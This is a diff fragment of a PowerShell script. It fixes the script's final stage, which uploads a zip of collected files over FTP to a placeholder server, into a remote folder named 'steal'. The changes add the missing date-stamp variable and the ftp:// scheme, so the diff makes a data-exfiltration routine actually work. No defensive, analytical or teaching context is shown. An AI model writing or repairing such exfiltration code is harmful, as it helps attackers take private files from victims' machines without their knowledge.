@@ -40,13 +40,14 @@ Get-ChildItem $zipFile | Where-Object { $_.Length -gt $maxSize } | ForEach-Objec
 
 # Upload compressed data to FTP server
 
+$dateString = Get-Date -Format "yyyyMMdd_HHmmss"
 $ftpServer = "your_ftp_server"
 $ftpUsername = "xxxx"
 $ftpPassword = "yyyy"
 $localFilePath = $zipFile
-$remoteFilePath = "/steal/$dateString.zip"
+$remoteFilePath = "steal/$dateString.zip"
 
-$ftpRequest = [System.Net.FtpWebRequest]::Create("$ftpServer/$remoteFilePath")
+$ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://$ftpServer/$remoteFilePath")
 $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
 $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
 
@@ -57,5 +58,3 @@ $fileContents = [System.IO.File]::ReadAllBytes($localFilePath)
 $requestStream = $ftpRequest.GetRequestStream()
 $requestStream.Write($fileContents, 0, $fileContents.Length)
 $requestStream.Close()
-
-
